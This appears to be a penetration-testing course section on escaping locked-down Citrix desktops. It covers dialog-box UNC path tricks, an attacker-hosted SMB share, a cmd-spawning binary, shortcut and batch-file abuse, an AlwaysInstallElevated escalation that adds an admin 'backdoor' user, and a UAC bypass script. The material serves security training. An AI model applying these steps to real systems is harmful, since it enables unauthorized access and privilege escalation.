Numerous organizations leverage virtualization platforms such as Terminal Services, Citrix, AWS AppStream, CyberArk PSM and Kiosk to offer remote access solutions in order to meet their business requirements. However in most organizations "lock-down" measures are implemented in their desktop environments to minimize the potential impact of malicious staff members and compromised accounts on overall domain security. While these desktop restrictions can impede threat actors, there remains a possibility for them to "break-out" of the restricted environment.

Basic Methodology for break-out:

1. Gain access to a `Dialog Box`.
2. Exploit the Dialog Box to achieve `command execution`.
3. `Escalate privileges` to gain higher levels of access.

In certain environments, where minimal hardening measures are implemented, there might even be a standard shortcut to `cmd.exe` in the Start Menu, potentially aiding in unauthorized access. However, in a highly restrictive `lock-down` environment, any attempts to locate "cmd.exe" or "powershell.exe" in the start menu will yield no results. Similarly, accessing `C:\Windows\system32` through File Explorer will trigger an error, preventing direct access to critical system utilities. Acquiring access to the "CMD/Command Prompt" in such a restricted environment represents a notable achievement.

There are many techniques which can be used for breaking out of a Citrix environment. This section will not cover every possible scenario, but we will walk through the most common ways to perform a Citrix breakout.

## Bypassing Path Restrictions

When we attempt to visit `C:\Users` using File Explorer, we find it is restricted and results in an error. This indicates that group policy restricts users from browsing directories in the `c:` drive using File Explorer. It is possible to utilize Windows dialog boxes to bypass this. From the dialog box, the next step is often to navigate to a folder path containing native executables that offer interactive console access (i.e.: cmd.exe). Usually, we have the option to directly enter the folder path into the file name field to gain access to the file.

In applications, features like Save, Save As, Open, Load, Browse, Import, Export, Help, Search, Scan, and Print, usually provide an attacker with an opportunity to invoke a Windows dialog box. There are multiple ways to open dialog box in windows using tools such as Paint, Notepad, Wordpad, etc. We will cover using `MS Paint` as an example for this section.

Run `Paint` from start menu and click on `File > Open` to open the Dialog Box.
![[paint.webp]]

With the windows dialog box open for paint, we can enter the [UNC](https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths) path `\\127.0.0.1\c$\users\pmorgan` under the File name field, with File-Type set to `All Files` and upon hitting enter we gain access to the desired directory.

## Accessing SMB Share from Restricted Environment

Having restrictions set, File Explorer does not allow direct access to SMB shares on attacker machine. However, by utilizing the UNC path within the Windows dialog box, it's possible to circumvent this limitation. This approach can be employed to facilitate file transfers from a different computer.

Start a SMB server from the attacker machine using Impacket's `smbserver.py` script.
```shell-session
root@ubuntu:/home/htb-student/Tools# smbserver.py -smb2support share $(pwd)

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

```

Back in the Citrix environment, initiate the "Paint" application via the start menu. Proceed to navigate to the "File" menu and select "Open", thereby prompting the Dialog Box to appear. Within this Windows dialog box associated with Paint, input the UNC path as `\\10.13.38.95\share` into the designated "File name" field. Ensure that the File-Type parameter is configured to "All Files." Upon pressing the "Enter" key, entry into the share is achieved.
![[paint_share.webp]]

Due to the presence of restrictions within the File Explorer, direct file copying is not viable. Nevertheless, an alternative approach involves `right-clicking` on the executables and subsequently launching them. Right-click on the `pwn.exe` binary and select `Open`, which should prompt us to run it and a cmd console will be opened.
![[pwn_cmd.webp]]

The executable `pwn.exe` is a custom compiled binary from `pwn.c` file which upon execution opens up the cmd.
```c
#include <stdlib.h>
int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}
```

We can then use the obtained cmd access to copy files from SMB share to pmorgans Desktop directory.
![[xcopy.webp]]

## Alternate Explorer

In cases where strict restrictions are imposed on File Explorer, alternative File System Editors like `Q-Dir` or `Explorer++` can be employed as a workaround.

It's worth noting the previous inability of File Explorer to copy files from the SMB share due to restrictions in place. However, through the utilization of `Explorer++`, the capability to copy files from the `\\10.13.38.95\share` location to the Desktop belonging to the user `pmorgan` has been successfully demonstrated in following screenshot.
![[Explorer++.webp]]

[Explorer++](https://explorerplusplus.com/) is highly recommended and frequently used in such situations due to its speed, user-friendly interface, and portability. Being a portable application, it can be executed directly without the need for installation, making it a convenient choice for bypassing folder restrictions set by group policy.

## Alternate Registry Editors

![[smallregistry.webp]]

Similarly when the default Registry Editor is blocked by group policy, alternative Registry editors can be employed to bypass the standard group policy restrictions. [Simpleregedit](https://sourceforge.net/projects/simpregedit/), [Uberregedit](https://sourceforge.net/projects/uberregedit/) and [SmallRegistryEditor](https://sourceforge.net/projects/sre/) are examples of such GUI tools that facilitate editing the Windows registry without being affected by the blocking imposed by group policy. These tools offer a practical and effective solution for managing registry settings in such restricted environments.

## Modify Existing Shortcut File

Unauthorized access to folder paths can also be achieved by modifying existing Windows shortcuts and setting a desired executable's path in the `Target` field.

The following steps outline the process:

1. `Right-click` the desired shortcut.
    
2. Select `Properties`.
![[shortcut_1.webp]]

3. Within the `Target` field, modify the path to the intended folder for access.
![[shortcut_2.webp]]

4. Execute the Shortcut and CMD will be spawned
![[shortcut_3.webp]]

In cases where an existing shortcut file is unavailable, there are alternative methods to consider. One option is to transfer an existing shortcut file using an SMB server. Alternatively, we can create a new shortcut file using PowerShell as mentioned under [Interacting with Users section](https://academy.hackthebox.com/module/67/section/630) under `Generating a Malicious .lnk File` tab. These approaches provide versatility in achieving our objectives while working with shortcut files.

## Script Execution

When script extensions such as `.bat`, `.vbs`, or `.ps` are configured to automatically execute their code using their respective interpreters, it opens the possibility of dropping a script that can serve as an interactive console or facilitate the download and launch of various third-party applications which results into bypass of restrictions in place.

1. Create a new text file and name it "evil.bat".
2. Open "evil.bat" with a text editor such as Notepad.
3. Input the command "cmd" into the file.
4. Save the file.
![[script_bat.webp]]

Upon executing the "evil.bat" file, it will initiate a Command Prompt window. This can be useful for performing various command-line operations.

## Escalating Privileges

Once access to the command prompt is established, it's possible to search for vulnerabilities in a system more easily. For instance, tools like [Winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) and [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) can also be employed to identify potential security issues and vulnerabilities within the operating system.

Using `PowerUp.ps1`, we find that [Always Install Elevated](https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated) key is present and set.

We can also validate this using the Command Prompt by querying the corresponding registry keys:
```cmd-session
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
		AlwaysInstallElevated    REG_DWORD    0x1


C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
		AlwaysInstallElevated    REG_DWORD    0x1
```

Once more, we can make use of PowerUp, using it's `Write-UserAddMSI` function. This function facilitates the creation of an `.msi` file directly on the desktop.
```powershell-session
PS C:\Users\pmorgan\Desktop> Import-Module .\PowerUp.ps1
PS C:\Users\pmorgan\Desktop> Write-UserAddMSI
	
Output Path
-----------
UserAdd.msi
```

Now we can execute `UserAdd.msi` and create a new user `backdoor:T3st@123` under Administrators group. Note that giving it a password that doesnâ€™t meet the password complexity criteria will throw an error.
![[useradd.webp]]

Back in CMD execute `runas` to start command prompt as the newly created `backdoor` user.
```cmd-session
C:\> runas /user:backdoor cmd

Enter the password for backdoor: T3st@123
Attempting to start cmd as user "VDESKTOP3\backdoor" ...
```

## Bypassing UAC

Even though the newly established user `backdoor` is a member of `Administrators` group, accessing the `C:\users\Administrator` directory remains unfeasible due to the presence of User Account Control (UAC). UAC is a security mechanism implemented in Windows to protect the operating system from unauthorized changes. With UAC, each application that requires the administrator access token must prompt the end user for consent.
```cmd-session
C:\Windows\system32> cd C:\Users\Administrator

Access is denied.
```

Numerous [UAC bypass](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC) scripts are available, designed to assist in circumventing the active User Account Control (UAC) mechanism. These scripts offer methods to navigate past UAC restrictions and gain elevated privileges.
```powershell-session
PS C:\Users\Public> Import-Module .\Bypass-UAC.ps1
PS C:\Users\Public> Bypass-UAC -Method UacMethodSysprep
```

![[bypass_uac.webp]]

Following a successful UAC bypass, a new powershell windows will be opened with higher privileges and we can confirm it by utilizing the command `whoami /all` or `whoami /priv`. This command provides a comprehensive view of the current user's privileges. And we can now access the Administrator directory.
